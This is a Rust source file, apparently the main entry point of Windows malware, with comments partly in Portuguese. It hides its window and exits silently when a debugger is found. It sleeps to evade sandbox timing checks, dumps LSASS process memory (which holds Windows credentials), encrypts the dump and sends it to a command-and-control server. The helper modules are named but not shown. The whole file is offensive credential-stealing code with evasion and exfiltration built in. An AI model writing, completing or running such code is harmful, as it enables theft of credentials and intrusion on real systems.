#![windows_subsystem = "windows"]

mod lsass;
mod evasion;
mod crypto;
mod exfil;

use std::thread;
use std::time::Duration;

fn main() {
    // Anti-debug check antes de tudo
    if evasion::is_debugged() {
        // Silently exit, don't alert
        return;
    }
    
    // Small delay to avoid sandbox time-based detection
    thread::sleep(Duration::from_secs(3));
    
    // Execute o dump LSASS
    match lsass::dump_to_memory() {
        Ok(dump_data) => {
            // Criptografa antes de enviar
            let encrypted = crypto::aes_encrypt(&dump_data);
            
            // Envia pro C2 via HTTPS
            match exfil::send_to_c2(&encrypted) {
                Ok(_) => {
                    // Success, clean exit
                    #[cfg(debug_assertions)]
                    println!("[+] Dump sent successfully");
                }
                Err(e) => {
                    #[cfg(debug_assertions)]
                    eprintln!("[-] Failed to send: {:?}", e);
                }
            }
        }
        Err(e) => {
            #[cfg(debug_assertions)]
            eprintln!("[-] Dump failed: {:?}", e);
        }
    }
    
    // Exit cleanly
}